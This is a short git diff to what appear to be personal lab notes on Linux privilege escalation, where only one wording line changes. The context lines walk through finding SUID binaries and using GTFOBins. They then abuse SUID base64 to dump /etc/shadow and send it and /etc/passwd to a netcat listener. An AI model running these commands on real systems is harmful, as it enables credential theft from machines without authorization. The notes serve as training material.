@@ -77,7 +77,7 @@ Practical ex (given ssh login, low priv):
 1. ssh into karen's account, run `id` to get a sense of privileges
 2. Based on the box, I run a `find -perm -4000...` for files that have SUID bit set (could also try `sudo -l` for other commands)
 	1. Results are then checked against GTFOBins to look for an exploitable program (use SUID filter)
-	2. (optional) overlook options because they don't seem sus
+	2. (optional) overlook some bins because they don't seem sus
 	3. find `base64` on GTFOBins, this will read out any file into base64, also has a --decode option 
 3. `base64 /etc/shadow | base64 -d > shadow.txt` to write out, and then decode the shadow file (make sure you're in a writeable dir)
 4. `nc ... < shadow.txt` to a listener to transfer files to local machine (send over `/etc/passwd `too) 
